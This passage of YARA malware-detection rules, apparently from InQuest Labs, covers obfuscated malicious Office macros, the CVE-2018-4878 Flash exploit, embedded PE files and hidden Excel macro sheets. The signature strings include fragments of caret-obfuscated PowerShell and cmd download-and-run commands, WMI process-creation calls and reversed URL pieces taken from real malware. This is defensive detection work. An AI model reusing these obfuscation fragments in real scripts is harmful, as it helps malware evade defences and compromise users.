        $ = "YnwvsjHluT = QStTbE + KlEoNu + MUvvlZJJ + OEsbQt"
        $ = "YuPaY = tQTEn - rfBzXE - 83931 * fOnFu * wmUPZ + bIKkG / (oadfLE / GTjidG"
        $ = "YvJuaRGFmtdMGdNYPrTS"
        $ = "YwZ_ZZB = 724234975"
        $ = "Z5719927"
        $ = "Z6_67243M94648X_6266s_3368"
        $ = "Z7953714"
        $ = "ZKEBf = CDate(62560"
        $ = "ZU1xZD.ZZUUAx.Text"
        $ = "ZVDAjzu = WvjwHIu"
        $ = "ZbGDv(1) = Left(\"JnZsMw\", 404"
        $ = "ZjXwAQLQS = \"Hel\" + \"l \" + \"("
        $ = "ZjYmJtnTi = Hex(uLftwisf)"
        $ = "ZjfUnXkLQ"
        $ = "ZnjqbD = 51374"
        $ = "ZvvzpG(2) = MidB(Pmlbl, 230, 883) + MidB(Pmlbl, 230, 883) + Left(bZGoFYi, 398) + Mid(PVPjOoqM, 329, 335"
        $ = "^.^g^e-t^i//:^ptt^"
        $ = "^3^41^;-^1^"
        $ = "^=^8)^s^H^q^Lf^h^5"
        $ = "^K^h^$(^e^l^i^"
        $ = "^e^h^sr^e^w^o^p&&^f^or"
        $ = "^ej^b^o-^wen=^MwH"
        $ = "_e/^-_W-"
        $ = "a0630155H37561D7_1927i09_2_"
        $ = "aAAAAAAX = ECw44o _"
        $ = "aCLElTN = \" \" + rzIomYCmv + BUicaEfwHES + \"{ N\" + XhoYVPWfjiGA + BNFjYQnYv + \"EW-\" + PRYKVKZmZQF + QjOzVqYbbmd + \"O\" + Vttvwln +"
        $ = "aEwWFLcmPsO"
        $ = "aPiANuqmWvB"
        $ = "a_AcAA1A"
        $ = "acvzzRBDzz = \",\" + \" \" + \" 26\" + \" \" + \" \" + \", \" + \" 2\" + \"4 \" + \" \" + \",\" + \"55\" +"
        $ = "adGjw = 72345 / caiuj / (lIztM * nwfLPk / 73400 - wAvdsI"
        $ = "ag0a27g720aia0"
        $ = "aiDWoLFl"
        $ = "apiYPNQwKiJCjzEUdnYq"
        $ = "asIFDlHbbDhcXCDKzrtErujd = 259126596"
        $ = "asvJq = (VSYLtc * isXQK) + 72840 - BojsAt * RzSrZK * 14469"
        $ = "autoopen( _"
        $ = "awoBADDA"
        $ = "b308_3_3"
        $ = "b602663. _"
        $ = "bBQAQCQ = CInt(864248896 - CDbl(QCUw4CA) * pZXZADQ * 746553661"
        $ = "bGENlBIUr"
        $ = "bHTMW = \"^\" + \" ^37\" + \" \" + \" 29 \" + \"+^64 \" + \" \" + \" 2^1 \" + \" +1\" + \"7 ^\" + \" 2\" + \"6"
        $ = "bQnMNMwC = \" \" + \" 5^5 \" + \"^\" + \"+37 \" + \" 36\" + \" \" +"
        $ = "bVoLQjGZG = Hex(otIIJQI)"
        $ = "bXcrBA = Sqr(8"
        $ = "b_0_705_ = Sgn(700430210 * Round(672395957"
        $ = "bacPsi = zGFYtu - LLzqAr - (19781 * bkhmQa"
        $ = "bcVWKKrvkFoWLnJ"
        $ = "bfBvpVnaCJvpNbkJBJpN"
        $ = "bjPczw = CStr(lCwjNk - pRIKO + 32230 * iWzcIF"
        $ = "buSHckDu = \"HeLL -e IAAuACg\" + \"AKABnAGUA\" + \"VAAtAFYAQQ\""
        $ = "bwsQOfvjNS"
        $ = "c156_430"
        $ = "c1666409"
        $ = "c3__9_54 = z672809"
        $ = "cAkA1wA1"
        $ = "cBija = 83888"
        $ = "cCEuU = Log(315038804"
        $ = "cGCUUZ1A"
        $ = "cGDABAQ.OQA1XAD"
        $ = "cHcJtNGRt"
        $ = "cIAIKZ = Tan(19588"
        $ = "cLYiAP = \"mD\" + \" /v^:O^\" + \" ^ \" + \" \" + \"/r\" + CStr(Chr(ZlQoajHzhIzP"
        $ = "cQQtmj = kzznBq"
        $ = "cYaDOlKZwKrnupvdiTK = 296641512"
        $ = "c_732269"
        $ = "caSdwLJz"
        $ = "cc4occUo"
        $ = "cqPMiu = PcfwCV = UMqkua"
        $ = "czjHkZ = zZrWzI - UfjKfS - JrklB / LzswG + ujsXU / vNwZXd"
        $ = "czvLCwz = Hex(TtBpXh"
        $ = "d391943 = (p_3_4494 * Fix(399737514 / CBool(j_2_820))) - S385003 / Oct(656307157) / 921253193 + CStr(p012_194) - 580513518 + Chr"
        $ = "d520432 = \"B9941630"
        $ = "dAUBAo4w"
        $ = "dDlXjF(0"
        $ = "dGA4xAAx"
        $ = "dGAZGX = Atn(294911941"
        $ = "dJNYo = hSSkPH + YRAdHC + lzDoRt + FfYNt"
        $ = "dJhYWGlWj"
        $ = "dKofZ = 36680"
        $ = "dWGCY = HKtwdM + fRMMwK + zcmvp + oPtbvB"
        $ = "dXahi = (18335 - YkOYKL - WtniX / UVXbS / (jkuff - KBPjh * (aXnaE * zbjKzY / rrVDHz - OZapiE"
        $ = "dkDx_UAB = nAowAAw"
        $ = "dlpCMXIVLXv"
        $ = "duKLJpbGHz"
        $ = "dvpCY(0) = 192"
        $ = "dzQzEHobo"
        $ = "dzcukrklkq.js"
        $ = "ebusinessbs = CLng(315"
        $ = "f0937__6"
        $ = "f7121435"
        $ = "fC4BDkcX"
        $ = "fDQBw4A = w1o1CU"
        $ = "fFXswVSz = \";73;46;\" + \"35\" + \";62;65;\" + \"5\" + \"3;43;\" + \"35;47;24\" + \";39\" + \";\" + \"50;71\" + \";47\" + \";31;3\" + \"0;41;73"
        $ = "fIULj = CLng(112302493"
        $ = "fLvEGtwatzv = \"^7\" + \" \" + \"^\" + \" ^;\" + \" \" + \" ^4\" + \"6 66 \" + \"5^4 2"
        $ = "fQkCAQUo = Atn(875120804"
        $ = "fZUDOrFpi"
        $ = "fcZXB(3) = MidB(shwKz, 567, 135) + Left(iMCJl, 246"
        $ = "fnijADztF"
        $ = "foPrhlj = Array(Uahrw, QlnKdM.Run!(nfSRnplJZj, swDPHCRc), jbESGbNS"
        $ = "fwAG_G Then"
        $ = "fziowVMn"
        $ = "hBt7YVKrp"
        $ = "hDDAAA = 796886080 * vDAUAc"
        $ = "hDtid(1) = Left(MadVr, 801"
        $ = "hKMbU = 136995925"
        $ = "hLAsT(0) = Left(qoNXlsT + jDHpESOokrLaPwuQtnw + fudMNJQf, 495) + Right(JwrJO + EjzUPYAmzDdjTJJpTAiT + RGDXHlB, 260) + InStr(cqKf"
        $ = "h_0029 = 621413701"
        $ = "hiUfG = \"AKwBbAEMASAB\" + \"hAFIAXQA2ADg\" + \"AKQAsAF\" + \"sAUwB\" + \"UAHIAaQBu\" + \"AEcAXQ\" + \"BbAEMASABh\" + \"AFIAX\" + \"QAzADQAKQAuA"
        $ = "hmZcW = Amjms + BUITF"
        $ = "hsjnq = 35944 - wiiLL * (wSCmM + bUlDrX"
        $ = "htRcaonnVjp"
        $ = "hvGqSVGBL"
        $ = "hzSRwBQJvlVd"
        $ = "i44302__"
        $ = "i4736 = Round(G8317 * Chr(120032450"
        $ = "i61663 = \"v8286705"
        $ = "i659_4.P4905_5.ControlTipText"
        $ = "i659_4.P4905_5.PasswordChar"
        $ = "iAAAA_CA"
        $ = "iBDAx1A = hCACZQ + CInt(Y4kAA4B) * 331553435 * CBool(133457324) + 103108128 / Round(kAGQADX) - PkUDkA + Sqr(127921634) - 8396488"
        $ = "iDwZAkA = ZBcB1Aw + CInt(wkAXGAA1) * 84471752 * CBool(442863379) + 962353833 / Round(AAADZA) - YwDQZBB + Sqr(231634437) - 692052"
        $ = "iGOCButAozMq"
        $ = "iGUXCABA"
        $ = "iJplwl(4"
        $ = "iQ4U1QBw"
        $ = "iQAZXDAD"
        $ = "iWBAWFDd = \"2;75;1\" + \"1;50;\" + \"72;12\" + \";12;56;\" + \"67;1\" + \"5;61;44"
        $ = "ia\", \"j\", \"a\", \"ps\", \"qw\", \"uj\", \"H\", \"h"
        $ = "icAAA4Ak"
        $ = "idnxQHzVi = Sgn(59371.484568226"
        $ = "input37 = deposit7"
        $ = "irCaJqwnP"
        $ = "irjGvvJKfEAbKhnopSzin"
        $ = "ispqD = CByte(325434282"
        $ = "iuUrOoiEw"
        $ = "ivjZO = Rnd(DKCisVuq"
        $ = "iwiPh = CBool(PQJFqJYU"
        $ = "izvchwfOiLm = \" ^2\" + \"3 ^ +\" + \"^\" + \"8 \" + \" \" + \" \" + \"+53\" + \" \" + \" +"
        $ = "j052640.A64818"
        $ = "j0_467(87197) = 352 + Int(A9_904) + J774001 + Int(482) + F04693 + j2580329 + 716 + z79189"
        $ = "j137668(18360"
        $ = "j3__8_38"
        $ = "j9___593 = 818566206 / Hex(d00_68 / Chr(E_0_2___ - CDate(104074348)) * 14131296 / 249637184) / Z6490420 - Fix(158767150"
        $ = "jABAcxXC"
        $ = "jMpjlZ(1) = MidB(SuJNj, 950, 667"
        $ = "jRVab = 30665"
        $ = "jWXajuuZfGWwouzzS"
        $ = "jXaIwkEK"
        $ = "jZFZGdcAvCiNLt"
        $ = "j_1_8826 = 26966254 / Hex(Y958__7 / Chr(E6_18_47 - CDate(474351511)) * 825416901 / 624998260) / C_9_09_ - Fix(849718355"
        $ = "jankksV = \", ;^ \" + \" ,\" + \"^\" + \" ^ ^\" + \" ^43 \" + \" , 3\" + \"^"
        $ = "jjTajD = \" u\" + \"e\" + \"C7+\" + \".gy\" + \",$Q\" + \"&&f\" + \"o\" + \"r\" + \" %S"
        $ = "jkVzi = \"w"
        $ = "jnSfp(0) = InStrRev(PVMpDJi + rwUtOzVVzIhXqkmCl + aUHwtjA, TdVmO + zXqzJsJzoozTXjXWzlSP + XnoJJv) + InStrRev(nmivid + KLEuAlnFBh"
        $ = "jujpOz(0) = 506070408"
        $ = "jvjapGTWD = \"OwerSHell . (\" + \"(VaRI\" + \"ABLe"
        $ = "jwcZoBkk"
        $ = "jxZxB1AB = Chr(UBwUcABo"
        $ = "k1QAUc = CVar(723354492 * Rnd(QQAkZAU * Round(721449592) / 21190537 * CLng(787349579 * Sqr(lco4ADo"
        $ = "k9UYoYwE"
        $ = "kA1AoAB = Tan(SUADAQoU - CSng(XBBAQkX"
        $ = "kAAAAA_U.jxcAxCA"
        $ = "kAD1DDBA = (T_XA1A1A"
        $ = "kSBEvQL = CBool(CzPLrC"
        $ = "kZAUxXA = zAAXAA1 + ChrW(cADGAk) * 960192802 * CBool(786191768) + 643047316 / Round(wQUACxDc) - A_ZAAA + Sqr(349236187) - 895928"
        $ = "kZCwAAo = Sin(829613004) + CSng(674709657"
        $ = "kcUXA11Z = _"
        $ = "kcZrVQn = \" \" + \"^3 +4\" + \"^4^ 44\" + \" 4^0\" + \"^ 6\" + \"^3^ \" + \"^ 48 \" + \" ^"
        $ = "kjkKW(0) = zHodID + QIOww"
        $ = "kkrVlLLLN = 251328809"
        $ = "knYApNAJ"
        $ = "koKctwoEpW"
        $ = "ksBozQ = \"\" + lkpvoSwQ + zzThFsUbYhGdWZ + \"w110\" + tiudJsCvWUjtWi + wCrIrsiOBq + \"z32\" + AINPJrYPW + GvXKkJbEqNhiT + \"m36\" + EBE"
        $ = "l87G86_64l66w65"
        $ = "l8847355.Create A_33800 + P39242 + i665411, r2795657, c_61385, B45219"
        $ = "lA4G4A1 = 139668389 - 640127231 + _"
        $ = "lA_AA_U = fUAXUA - BAZDco1"
        $ = "lDkMvzTaVGFziNRlRJvOsip"
        $ = "lGGo8AsL"
        $ = "lHwRi = muTPLk + CArSjA + cSXzLD + Yzcttb"
        $ = "lK4vR5\" + (\"989\" + \"757\") + \"Z8VBGR\" + (\"wGVXaG"
        $ = "lcUc_QQQ"
        $ = "lqaKKD = \" ,126 ,42,8\" + \"9 , 115 , 121, \" + \"126 ,111\" + \" ,103 , 36,68\" + \" ,\" + \" 1\" + \"11,126,36,93\" + \", 1\" + \"11,104 , 73"
        $ = "lssEr = \"zFNO"
        $ = "m1463_41 = ((\"q70184\") + (\"240575542"
        $ = "mBB4AQ = CVar(YDAAAA"
        $ = "mHVqwl = (OwaRDC / VWqcP / 84651 / EiBMZ + 58302 * IFjGu / 13241 * jjtzFH * (hHCBj - jqCLv"
        $ = "mHbaikOrPnUzFVrBGJit"
        $ = "mRmSnzlJA"
        $ = "mTvTcDpC"
        $ = "mZAAAkAA"
        $ = "mbsOjpdHAzzbmnKkNKNsJ"
        $ = "mbtRiAuK"
        $ = "mgmts:Win32_ProcessStarTUP"
        $ = "miUdd = JEfhs - lJWSDE / 18086 + XDaab"
        $ = "mjUiWuWoqvsXSzwVfZPQvFiGwAIP"
        $ = "mlBiZ7CA"
        $ = "mlMYidDNAvwzNFpnhmwrknw"
        $ = "monitormj"
        $ = "muLbOK = 66528 + wjizd / (51829 / aMzaj * jsJrs / FwzLn"
        $ = "mwTIp = \"leh\" + \"^sr^e^\" + \"w^op\" + \"&&^f^\" + \"or /^"
        $ = "mzwitB(1"
        $ = "n30164 = w__0857_"
        $ = "n32_Process\").Create"
        $ = "n4ABowAQ"
        $ = "n5685_52"
        $ = "nAABADAG"
        $ = "nAAQBUAQ"
        $ = "nAC8AcwAnA"
        $ = "nAUcxB = jC_AAC + ChrW(FUXkQAZA) * 110314554 * CBool(966716839) + 567144626 / Round(rA_AAQA) - RkCBko + Sqr(953857155) - 3285409"
        $ = "nA_xBDAU"
        $ = "nDkBG_i1"
        $ = "nQAUUA1A = 449787714 * fAA_QAA"
        $ = "nWnfBnjdjTEZkt"
        $ = "n_0758_0"
        $ = "n_5462_ = \"KwAnAC4AM\" + \"QA0ADgALwA1AEMA\" + \"VAAwAEI\" + \"AJwAr\" + \"ACcAQwAn\""
        $ = "navigatelh"
        $ = "nivEzTYtDDfM"
        $ = "niwjTDlMz = Rnd(HtwsldoV)"
        $ = "nnirGkPwq = Log(95212520"
        $ = "o716__b3_680F97_168Q4312_12"
        $ = "oAZACAxZ"
        $ = "oILOuavQqjmIdBz"
        $ = "oQqSLm = (54817 - horYVp / (87510 * JqZlI / 59419 - wzoTMU"
        $ = "oVszCbfj"
        $ = "osjZOrwOZfkY"
        $ = "owBDAxAA = ZCA_BZ / 198442998 / _"
        $ = "owjIl = rFlOWTVDplz + FuqMLjzcR + zskaN + tQTdBIuqZwS"
        $ = "owjuirkvizs"
        $ = "p17935__"
        $ = "p219465(87302"
        $ = "p4_40217"
        $ = "p5874_ = \"597583752"
        $ = "p5EhmDP0"
        $ = "pJWBQb = 88288 + Atn(39942) / 63460 / Round(13327) / 7065 / CInt(DPpYT"
        $ = "pOCom(2) = Mid(fmwSuvRQ, 102, 719) + Mid(fmwSuvRQ, 102, 719"
        $ = "pOoHiw = HQdGRFc.ContainingRange + LiwHAuhw + JirorIHQ + OjzKiGwW"
        $ = "pSOwXzJ = uozJ7uv(uozJ7uv(\"win\" + uozJ7uv(uozJ7uv(\"mgmts:w\")) + \"in32_process"
        $ = "pUrjuOOoRY"
        $ = "pVwAUC = CDate(71034"
        $ = "p_1965 = vbError - vbError"
        $ = "pixel18 = GB39"
        $ = "pjYpVUD\" + (\"479\" + \"370\") + \"tI3czL_7\" + (\"NiA6_i"
        $ = "ptSQnhhknbabsDVBArlzUK"
        $ = "pztzj = ITzTR + RzCJVzR + dQlMJ + szqwpiP + iOHAbBX"
        $ = "qAUQ4BUD"
        $ = "qA_A_AUB"
        $ = "qBtVoMDADiFCvPIDYimjBsTGvwT"
        $ = "qMqJiEcwFfX"
        $ = "qPtYcqaZH"
        $ = "qPuCVTbq"
        $ = "qRiRww(2"
        $ = "qUAQ1A_Q = ZB_Bo_ + ChrW(qAUwACUG) * 434256303 * CBool(437773829) + 859097120 / Round(OXAX41UA) - lcAQQGDU + Sqr(794212281) - 29"
        $ = "qftnh = \"bbzcPkwY"
        $ = "qhmitpvuUJbLKDfKXGdzrBs = fLzwjfhnGfwGZZw"
        $ = "qiAAqY(1"
        $ = "qiAAqY(2"
        $ = "qjzcp(2) = 74"
        $ = "qkZ8CbZK"
        $ = "qrZAzHuCdIpMoicBUuoCSdKB = LDjKFYFBWtsRzVtNwHzKwb"
        $ = "qvwdCYDianKaMpEYouFpERA"
        $ = "qwZbYrSV"
        $ = "qwcZAD1A"
        $ = "r62893 = ((\"I28954\") + (\"659480211"
        $ = "rABXAAA = Round(OkAAQU"
        $ = "rDDMzX(0) = jmiEjf + AptiXt"
        $ = "rFwJBNF = CByte(225624211"
        $ = "rRRuwCLnEbsuEnojGwWFICIEZ"
        $ = "rUEXzd = (GpPcj - MiwGY) * Mraiv / ssGCvX / 93877 * Gzzczk"
        $ = "r^o^tc^e^h//^:^p^t^t"
        $ = "rej3u7Q = Round(19909.986118677)"
        $ = "resources/tyvldlikgp"
        $ = "rhNmWZ = FmpcmR"
        $ = "rkjsFtIvcwDGWw"
        $ = "rlnzQS = bdolG + UlNMi"
        $ = "s360_275 = ((\"m1_025_\") + (\"720877536"
        $ = "s6397073 = w660__5"
        $ = "s:Win32_ProcesSstartup"
        $ = "sAZU_AQ1"
        $ = "sBAAACAZ"
        $ = "sLRuWqAmV = Array(EPcWu, DhjiWP, uMvMh, Interaction"
        $ = "sNGKFzkiTVM = \", ; \" + \"G\" + \"e^Q \" + \",\" + \" ; 7^1\" + \" , \" + \"; ( \" + \"(\" + CStr(Chr(tTYDsZXDMoaDiZ + cbOSAIV + 99 + iwzpTW"
        $ = "sOX5r1 = DYnFYn + \"win\" + I_0KNb"
        $ = "sTowj = izkokRnI + kcatE + oDNLTcR + VbjKlwRsjHL + ljSQsvtp"
        $ = "sXUZABAB"
        $ = "sYCizskD = Hex(ptmhpNW)"
        $ = "sYbfXo = 91898 + kaDczc + (70027 * CDbl(EzzVPQ) - RYoZs / CSng(39930) - RrTEf / Hex(QPEiKY) + 94379 - 59598"
        $ = "sZLoOrifv = \"fQB7ADgANwB9\" + \"AHsAOQAzA\" + \"H0AewA3A\" + \"H0AewA2AH\" + \"0AewAxADIAf\" + \"QB7ADcAN\" + \"gB9AHsANQA0A"
        $ = "saJXjomUOMOwEl = ChrB(327660076 / ChrB(59848184))"
        $ = "siWzCGiO = ZjXwAQLQS + djrPUZFuM + BclUwON + SukzncS"
        $ = "sifxsbscux/Mzvrvrnidsv"
        $ = "soHZJH = 30973 + DZXmU + (99000 * CDbl(nFpqX) - jMCZM / CSng(10566) - QXnRNK / Hex(TaNjB) + 9437 - 5465"
        $ = "ssUp3vV\" + (\"115\" + \"990\") + \"Su7RZqP0\" + (\"ki7l0aC"
        $ = "stMiVSQOwSfBctplTTMoTTSI = 63283541"
        $ = "synergies78 = Array(Steel97, userfacing1, Park30, reciprocal90, TurkishLira30, dynamic33, wireless52"
        $ = "t019931z_7560T5172858J66671"
        $ = "tAcAAAXA"
        $ = "tAw4DAcA = AAwoDoD.AD1AA4Ax + A4_xwQG.DAZAAAA + AAwoDoD.AD1AA4Ax.PasswordChar + A4_xwQG.NXZCk4Q + AAwoDoD.AD1AA4Ax.PasswordChar"
        $ = "tDwDTjjp = CByte(278665600"
        $ = "tGZWDTiw = \"^i^f %^D=^=^\" + \"0 c^a^l^l %^o^\" + \"3^W:^~^-^3^7^5%\" + \"\"\"\" +"
        $ = "tUC_ZCUA"
        $ = "t^ac^}^;^k^a^er^"
        $ = "tb5jnov = zUATc971 + \"win\" + vOC56Bj"
        $ = "tfzCc = 65748"
        $ = "toC4_XQB"
        $ = "tsTJGE(0) = 556"
        $ = "twEmzUmLv = RWXqI + kwYKPS + HoFsiaonkoD"
        $ = "u033_53 = \"298163728"
        $ = "u34_959 = (k__5_51 * Fix(652825974 / CBool(v0140_))) - P_621_ / Oct(880846215) / 835072291 + CStr(l273__8) - 597682159 + ChrB(F5"
        $ = "u3609229 = \"s4740_67"
        $ = "u3661479"
        $ = "u4PIMv\" + (\"593\" + \"875\") + \"dHLua5m\" + (\"sURr9Hjj"
        $ = "u734189 = 108453197"
        $ = "u78_70_ = (h_72239 * Fix(498377649 / CBool(n855_662))) - J31638 / Oct(88853536) / 618375667 + CStr(p0__2_) - 935590778 + ChrB(j_"
        $ = "uAEMAbwBEAEkAb"
        $ = "uDAAAAAA"
        $ = "uEaCPphzkHrHKcM"
        $ = "uQAorGNZjtwkMLvtaXi"
        $ = "uQTJMpiif = \" \" + \" ^30 \" + \" \" + \",^"
        $ = "uRDFZM(1"
        $ = "uUAoQDA = mXUA_Bo + Int(133103597 * Asc(jD1k_BD) + NAXAAAB _"
        $ = "uYlnFkjui = Cos(OlSaauC"
        $ = "uZVQUw = 90142"
        $ = "ubiihJqs"
        $ = "ubqwM = Array(\"Sp\", \"r\", \"dj\", \"Y\", \"z\", \"O\", \"D\", \"qH\", _"
        $ = "ucPurE = (ADlOam - icfvLU) * HXaIT / ojYwAa / 38012 * XAfho"
        $ = "ujHOZYuUzwX = pZaXc"
        $ = "ukMzHfzwu.Run@ WfOWA, tcRWMjZ"
        $ = "unAvFQTdh = \"8;38;1\" + \"3;5\" + \"9;59;0;7\" + \"3;71;71\" + \";59;60\" + \";30;\" + \"24;60;20;\" + \"60\" + \";36"
        $ = "uxCDQAAC"
        $ = "uznIjOKPmOnYku"
        $ = "v1991998"
        $ = "v4559575n05_89t230_91q5396_"
        $ = "v649439 = \"RsHeLl -nop \" + \"-e JAB\" + \"WAF8AN\" + \"AA0ADcAXwA9ACg\" + \"AJwBM\" + \"A\""
        $ = "v8_08__ = 765669961"
        $ = "vAAACwA = d1kw_c + ChrW(EZDUAwAc) * 712441804 * CBool(46789863) + 52370290 / Round(uwcAxxB) - RA_AAZZ + Sqr(812316541) - 7839888"
        $ = "vCjnYXQlTnRw"
        $ = "vIkXYCiCiJdfrH"
        $ = "vVslSIQKXpkfFPIaqovQfEn"
        $ = "vdiiYOBwhmkTijMVrRJpI"
        $ = "viVmW = PYccfp + UvCjBz + JHMHj + FzijCf"
        $ = "voA1BQAo"
        $ = "w4702276 = i__170 + (U44467) _"
        $ = "w70886(18360"
        $ = "w841331t8278390K032708o59372_"
        $ = "w8__2381"
        $ = "wAA1AACD"
        $ = "wAcAQ14k = 685405474 * OAxAUA"
        $ = "wCzRSI = 3632"
        $ = "wDAA1ckC"
        $ = "wIRbd = CLng(ThGiiHEYn"
        $ = "wOfEb = qroAQ + CMGzWw"
        $ = "wQAcBD = hCwAcQAA - 806985297 - 77596638 + Log(607927015 - Atn(nkQwBA / fUAAAUxw + GQBZAABD / Tan(669942182))) * (7151234 + Sgn"
        $ = "wRwPdQ = (fpowW - vjDrSw) * OQuZSw / jsOSIk / 20646 * cCCGm"
        $ = "wWNIMvAwa = \"if %r g\" + \"eq 77 call\" + \" %4\" + \"RxW:~-354%\" + CStr(Chr(hWnrfwjVMivvIV + nqdiIOoHzjudW + 34 + GAWuFIr + wiHQDKrRo"
        $ = "wXGNIk = (iMhqp - cwwRZ) * HNrwQ / QhsLb / 2888 * NbcBIw"
        $ = "wYYlfGUvcqFJOmhzWBzJjnP"
        $ = "w_10_64_"
        $ = "w__7726 = 251208046 + f_89_2__"
        $ = "wflziv = 19414"
        $ = "wiPwr = zaLSrE + oTcjMD * WLjEWd - PUOlMG * NJCTN / Hzirvi + (70868 / KVPZZ"
        $ = "withdrawal45 = Customizable61"
        $ = "wjHfMJHPhFalrQ"
        $ = "wkACGAZA = rkAwAAA _"
        $ = "wsJYoB(0) = 46282 / PYQtS * 66626 / YjdLF"
        $ = "wshwDSiSFKuOZdSYMERkYDdDupCnZ"
        $ = "wtwiFzXM = \"^J^m/^y^b^.^x^u^\" + \"l^-^ar^o^l^\" + \"f^.w^w^w//^:p^t^t^h^\" + \"@^w^k^q^X^jO^G/k\" + \"^u^.^oc^.c^"
        $ = "wvlbToZkFNjAQQ"
        $ = "wwHjQI = Atn(vDVWrd"
        $ = "wwsTUQXB"
        $ = "wzvncKv = \"6\" + \";59;\" + \"25;60;\" + \"2\" + \"3;\" + \"5\" + \"2;52;23;2\" + \"4;58;32;58\" + \";19;52;46;\" + \"59;67;\" + \"60;\" + \"25;72;3;1"
        $ = "z198_64O0416_28l3_230n772537"
        $ = "z9774345 = (\"59943327\" + \"z_33835_\" + (\"l944392\" + (\"657786304\") + (\"383289934\" + (\"514477551"
        $ = "zAUXAoxZ"
        $ = "zBAkxAo_"
        $ = "zBBoGXA = (583751228 - Chr(QA_AC1) / NABkxB / 545360112 + C_AA_D / Fix(466911424 + Log(zQAUBBw * Sgn(946967472) + TDAAAA /"
        $ = "zBKzMqFH = YNzoaWiSpXj + FVucD + VDTWq + kzSSw"
        $ = "zDnWCd = CDate(uiztj + Sin(87669 + 62706) * 801 * CInt(14211))"
        $ = "zMEwc(0) = InStrRev(BiIjfpc + HmUaFvwCaibowKouljPw + znYREmvb, nqPUDOBk + GMjzDVBOKsntbFlGnjzJH + uUqXhiw) + InStrRev(nGYOjlNN +"
        $ = "zMMwvHJEZfCwrDiwGYWqLd = 303970696"
        $ = "zMlUdV(0"
        $ = "zQwAxAkG = aGAABB + CInt(lU1_4wA) * 975006622 * CBool(717383506) + 920488259 / Round(B_UAA1) - iBAQk_x + Sqr(671419017) - 387954"
        $ = "zQzvdSLFHWLbuuGWVjvVDNLlapLjYEC"
        $ = "zRYzzSVui"
        $ = "zRvjzjtR = Log(19471286"
        $ = "zUzTlCvKQDt = \",\" + \"22,54,9,\" + \"38,\" + \"20,22,1\" + \"2,6,71,26"
        $ = "zXWqB = Sin(16519"
        $ = "zbnkRrLw = CStr(Chr(UNAVmQRbZdI + EBiIZwVGHwsXN + 109 + mZqwfEYmLcUp + ZJHJZTMlPtbaUM))"
        $ = "zdnddCnJpZjKNKjshDJRGu"
        $ = "zijsUo = 15953 / odDoHc / (jQraY * FACIL / 47123 - roFaqh"
        $ = "zjNZs = cmqVrmsKDBT + kzNsWi + wzSPnzZF + nvHHSUPYU + iXcbiP + uOsXYWENi"
        $ = "zkGAQDXQ = Tan(nA_CwUQ - CSng(oxoGAA"
        $ = "zlj;$Yrvc"
        $ = "zlkRn = (49158 * 13485 - 84332 - CVSPU + 98818 - DwpWv * (62185 * 98498 + jJwzjE + vOtwZJ"
        $ = "znrDVPDJDWXNjUsWzE"
        $ = "zoFpzHWDhVIaYc"
        $ = "zpQmZCHN = 220745380"
        $ = "zuHWYwdF"
        $ = "zwUAwkAU"
        $ = "zwXjGIFj = \"3^\" + \"91\" + \"w9\" + \"^0\" + \"5^\" + \"m\" + \"^\" + \"1"

    condition:
        any of them
}
/*
This signature is mostly public sourced and detects an in-the-wild exploit for CVE-2018-4878. Following the
conversation at:

    http://blog.inquest.net/blog/2018/02/07/cve-2018-4878-adobe-flash-0day-itw
    https://twitter.com/i/moments/960633253165191170

 InQuest customers can detect related events on their network by searching for:

    event ID 5000798
*/

rule CVE_2018_4878_0day_ITW
{
    meta:
        Author      = "InQuest Labs"
        URL         = "https://github.com/InQuest/yara-rules"
        Description = "This signature is mostly public sourced and detects an in-the-wild exploit for CVE-2018-4878."

    strings:
        $known1 = "F:\\work\\flash\\obfuscation\\loadswf\\src" nocase wide ascii
        $known2 = "G:\\FlashDeveloping" nocase wide ascii
        $known3 = "Z:\\Main\\zero day\\Troy" nocase wide ascii
        $known4 = "C:\\Users\\Rose\\Adobe Flash Builder 4.6\\ExpAll\\src" nocase wide ascii
        $known5 = "F:\\work\\flash\\obfuscation\\loadswf\\src" nocase wide ascii
        $known6 = "admincenter/files/boad/4/manager.php" nocase wide ascii

        // EMBEDDED FLASH OBJECT BIN HEADER
        $header = "rdf:RDF" wide ascii

        // OBJECT APPLICATION TYPE TITLE
        // disabled 2/13/18 due to false positive on 2a75ff1acdf9141bfb836343f94f4a73b8c64b226b0e2ae30a69e9aacc472cba
        // $title = "Adobe Flex" wide ascii

        // PDB PATH
        $pdb = "F:\\work\\flash\\obfuscation\\loadswf\\src" wide ascii

        // LOADER STRINGS
        $loader1 = "URLRequest" wide ascii
        $loader2 = "URLLoader" wide ascii
        $loader3 = "loadswf" wide ascii
        $loader4 = "myUrlReqest" wide ascii

        // 1a3269253784f76e3480e4b3de312dfee878f99045ccfd2231acb5ba57d8ed0d.fws exploit specific multivar definition.
        $observed_multivar_1 = /999(\x05[a-z]10[0-9][0-9]){100}/ nocase wide ascii
        $observed_multivar_2 = /999(\x05[a-z]11[0-9][0-9]){100}/ nocase wide ascii
        $flash_magic         = { (43 | 46 | 5A) 57 53 }

        // 53fa83d02cc60765a75abd0921f5084c03e0b7521a61c4260176e68b6a402834 exploit specific.
        $exp53_1 = "C:\\Users\\Miha\\AdobeMinePoC"
        $exp53_2 = "UAFGenerator"
        $exp53_3 = "shellcodBytes"
        $exp53_4 = "DRM_obj"
        $exp53_5 = "MainExp"

    condition:
        ($flash_magic at 0 and all of ($observed_multivar*))
            or
        (any of ($known*))
            or
        // disabled 2/13/18 due to false positive on 2a75ff1acdf9141bfb836343f94f4a73b8c64b226b0e2ae30a69e9aacc472cba
        //(all of ($header*) and all of ($title*) and 3 of ($loader*))
        //    or
        (all of ($pdb*) and all of ($header*) and 1 of ($loader*))
            or
        ($flash_magic at 0 and all of ($exp53*))
}
rule Embedded_PE
{
    meta:
        Author      = "InQuest Labs"
        URL         = "https://github.com/InQuest/yara-rules"
        Description = "Discover embedded PE files, without relying on easily stripped/modified header strings."
    strings:
        $mz = { 4D 5A }
    condition:
        for any i in (1..#mz):
        (
            @mz[i] != 0 and uint32(@mz[i] + uint32(@mz[i] + 0x3C)) == 0x00004550
        )
}
// see the relevant post at: http://blog.inquest.net/blog/2019/01/29/Carving-Sneaky-XLM-Files/
rule Excel_Hidden_Macro_Sheet
{
    meta:
        Author      = "InQuest Labs"
        URL         = "https://github.com/InQuest/yara-rules"
        Description = "http://blog.inquest.net/blog/2019/01/29/Carving-Sneaky-XLM-Files/"
    strings:
            $ole_marker     = {D0 CF 11 E0 A1 B1 1A E1}
            $macro_sheet_h1 = {85 00 ?? ?? ?? ?? ?? ?? 01 01}
